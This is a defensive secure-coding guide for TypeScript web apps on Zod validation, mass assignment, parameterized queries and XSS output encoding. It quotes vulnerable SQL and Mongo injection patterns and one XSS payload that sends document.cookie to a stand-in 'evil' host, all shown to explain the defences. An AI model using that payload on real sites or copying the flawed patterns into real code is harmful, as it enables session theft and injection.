# Guard: input validation with Zod

Validate every request body/query at the trust boundary. Reject unknown fields — this closes
mass-assignment and shrinks injection surface at once.

## Validate a request body

```ts
import { z } from 'zod'

const CreatePost = z.object({
  title: z.string().min(1).max(200),
  body: z.string().max(10_000),
}).strict()   // .strict() → reject any extra field (blocks mass assignment)

export async function POST(req: Request) {
  const parsed = CreatePost.safeParse(await req.json())
  if (!parsed.success) {
    return Response.json({ error: 'Invalid input' }, { status: 400 })  // don't echo internals
  }
  const { title, body } = parsed.data
  // ... use ONLY validated fields
}
```

<a id="pick-allowed-fields"></a>
## Stop mass assignment

Never spread user input into a DB write. Pick an explicit allow-list:

```ts
// ❌ user can set role/isAdmin/credits/ownerId
await db.user.update({ where: { id }, data: { ...req.body } })

// ✅ only these fields, and ownership enforced separately (see auth-middleware.md)
const data = CreateUser.pick({ name: true, bio: true }).parse(req.body)
await db.user.update({ where: { id: session.user.id }, data })
```

<a id="parameterised-queries"></a>
## Parameterize queries (no string-built SQL)

```ts
// ❌ SQL injection
db.query(`SELECT * FROM users WHERE email = '${email}'`)
// ✅ parameterized
db.query('SELECT * FROM users WHERE email = $1', [email])
// ✅ ORM: Prisma/Drizzle/Supabase query builders parameterize for you — prefer them
```

For Mongo, never build a query object from raw `req.body` (operator injection); validate types
first (`z.string()` so `{$ne: null}` can't slip in).

<a id="output-encoding"></a>
## Encode on output (stops reflected XSS)

Validation is an **input** control; escaping is an **output** control. You need both, and they
happen in different files. React already escapes `{value}` — the bug is nearly always the escape
hatch:

```tsx
// ❌ renders attacker-supplied markup AS markup
// <div dangerouslySetInnerHTML={{ __html: searchParams.get('q')! }} />

// ✅ let React escape it
<div>{q}</div>
```

When you truly must render HTML (a rich-text field, a rendered markdown comment), sanitize it —
server-side, so a client bypass does not skip the step:

```bash
npm i isomorphic-dompurify
```

```ts
// app/posts/[id]/page.tsx  (server component)
import DOMPurify from 'isomorphic-dompurify'

const clean = DOMPurify.sanitize(post.bodyHtml, { USE_PROFILES: { html: true } })
return <article dangerouslySetInnerHTML={{ __html: clean }} />
```

Outside React, escape for the exact context you are writing into — HTML text, an attribute, a URL
and the inside of a `<script>` block each need different treatment, and one `escapeHtml()` does
not cover all four. Simplest rule: never interpolate user input into a `<script>` block or an
`on*=` attribute at all; pass it as JSON in a `data-` attribute and read it from JS.

Where: the component or template that renders the value, not the route handler that received it.

Protects against: a link like `?q=<img src=x onerror=fetch('//evil/'+document.cookie)>` executing
on your origin and taking the visitor's session with it.
Does **not** protect against: DOM XSS you write yourself (`el.innerHTML = location.hash`), or
stored HTML sanitized with too generous an allowlist. Add a CSP as the second layer — see
[security-headers.md](security-headers.md#csp) — so an injection that slips through still cannot
send the data anywhere.

## Bound the input
Cap array lengths, string sizes, and pagination limits (`z.number().int().min(1).max(100)`) to
prevent resource-exhaustion DoS.

## Notes
- Validate on the **server**. Client validation is UX, not security.
- Return generic errors to the client; log details server-side only.
